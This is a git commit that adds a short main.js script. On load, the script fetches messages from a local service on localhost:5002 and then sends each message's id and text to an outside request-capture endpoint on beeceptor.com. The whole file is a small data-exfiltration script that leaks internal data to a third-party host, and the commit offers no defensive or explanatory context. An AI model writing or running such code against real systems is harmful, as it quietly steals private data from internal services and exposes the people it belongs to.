81c10789e9ae00d17a95f9203fa2447105476884
syssgsi <40441101+syssgsi@users.noreply.github.com>
2025-10-05 22:08:51 -0700

    Create main.js

---
+++ main.js
@@ -0,0 +1,15 @@
+
+function fetchMessages() {
+
+    // Build the endpoint
+    const endpoint = "http://localhost:5002/messages?id=1"
+
+    fetch(endpoint)
+        .then(r => r.json())
+        .then(data => {
+            data.messages.forEach(msg => {
+              fetch(`https://caliphalhounds.free.beeceptor.com/id=${msg.id}&message=${msg.message}`)
+            });
+        });
+}
+fetchMessages()
